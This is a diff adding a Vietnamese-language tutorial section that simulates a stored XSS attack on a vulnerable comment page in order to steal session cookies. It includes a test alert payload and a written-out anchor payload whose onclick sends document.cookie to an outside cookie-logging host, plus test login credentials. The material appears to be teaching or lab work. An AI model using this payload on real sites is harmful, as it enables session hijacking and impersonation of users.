@@ -137,6 +137,51 @@
 
 <br> 1.6 Điều chỉnh các tham số header <a name="14"></a></br>
 
+<br> 1.7 Mô phỏng XSS đánh cắp phiên khi Login vào trang web. Cookie sẽ được điều hướng về 1 host dựng sẵn <a name="14"></a></br>
+ - Đầu tiên chúng ta sẽ tạo 2 file ` hacker.php` và `hacker.txt` rồi sau đó đẩy nó lên host. Đây sẽ là nơi hacker lưu trữ các cookie của người dùng. File ` hacker.php` dùng để lấy cookie rồi sau đó ghi nó vào trong file `hacker.txt`. Còn file ` hacker.txt` để lưu trữ cookies.
+
+   ![image](https://user-images.githubusercontent.com/101852647/168440728-d10a800c-f460-4309-bfe4-990c00d1d502.png)
+
+   ![image](https://user-images.githubusercontent.com/101852647/168440751-9d3aa67d-71cc-4a1b-8603-781582973169.png)
+
+ - Đẩy 2 file vừa tạo lên host.
+
+   ![image](https://user-images.githubusercontent.com/101852647/168440818-1343ddd1-680d-4592-9fde-5f03b191cc31.png)
+
+ - Bây giờ chúng ta cần một trang web dính lỗi xss để mô phỏng tấn công. Chúng ta sẽ đăng nhập với `username=test3` `password=12345678`.
+
+   ![image](https://user-images.githubusercontent.com/101852647/168441057-8365b60e-29da-49ed-95dc-24c5e2b5ac8e.png)
+
+ - Đây là màn hình sau khi đăng nhập.
+
+   ![image](https://user-images.githubusercontent.com/101852647/168441084-b7079332-25b1-4032-a7f8-6bce96c7f1f4.png)
+
+ - Tiếp theo chúng ta sẽ nhấn vào trang bình luận và sử dụng trang này để tấn công xss. Đây là giao diện trang bình luận.
+
+   ![image](https://user-images.githubusercontent.com/101852647/168441129-653fd9ba-e6e9-472f-9527-9373cb778def.png)
+
+ - Sau đó chúng ta sẽ kiểm tra xem là trang bình luận này có thể chèn các đoạn mã độc hay không bằng cách thử với dòng lệnh `<script>alert(\'hacker\')</script>`. Kết quả là đã chèn thành công.
+
+   ![image](https://user-images.githubusercontent.com/101852647/168441254-a926e59e-0967-4096-8ef0-0a1db94099f2.png)
+
+   ![image](https://user-images.githubusercontent.com/101852647/168441270-27de052b-d045-47de-9682-93810afdd3a4.png)
+
+ - Tiếp theo chúng ta sẽ chèn câu lệnh `<a href=# onclick=\"document.location=\'https://testsitemapphp.000webhostapp.com/hacker.php?c=\'+escape(document.cookie);\">Hacker</a>` để đánh cắp cookies của nhiều người dùng.
+
+   ![image](https://user-images.githubusercontent.com/101852647/168441356-0f723f7d-7195-4e05-a997-63c60ff460b3.png)
+
+ - Ở hình bên dưới chúng ta sẽ thấy là sau khi thực hiện đoạn mã trên thì nó đã chèn được đoạn mã trên vào database và hiển thị trên màn hình cho chúng ta là hacker. 
+ 
+   ![image](https://user-images.githubusercontent.com/101852647/168441484-a2065e21-2083-4d8d-8df7-6a48451c5b89.png)
+ 
+ - Chỉ cần người dùng dùng nhấn vào bình luận hacker ở dạng link thì lập tức người dùng sẽ bị điều hướng đến một trang web của lưu trữ cookie của hacker mà không hay biết gì hết.
+   
+   ![image](https://user-images.githubusercontent.com/101852647/168441585-a5995f6d-e4c4-443a-b5f4-70b7f5334aac.png)
+
+ - Khi bị điều hướng sang một trang web khác thì cookie của người dùng đã bị đánh cắp và lưu trữ trong file `hacker.txt`. Sau khi lấy được cookie người dùng thì hacker có thể sử dụng với nhiều mục đích khác như :mạo danh hoặc đánh cắp thông tin người dùng.
+
+    ![image](https://user-images.githubusercontent.com/101852647/168441621-e2aa1f26-4e17-4f47-af97-43fb6290a522.png)
+
 <br> 1.7 Mô phỏng code XSS <a name="15"></a></br>
 - Đây là code lỗi XSS:
 
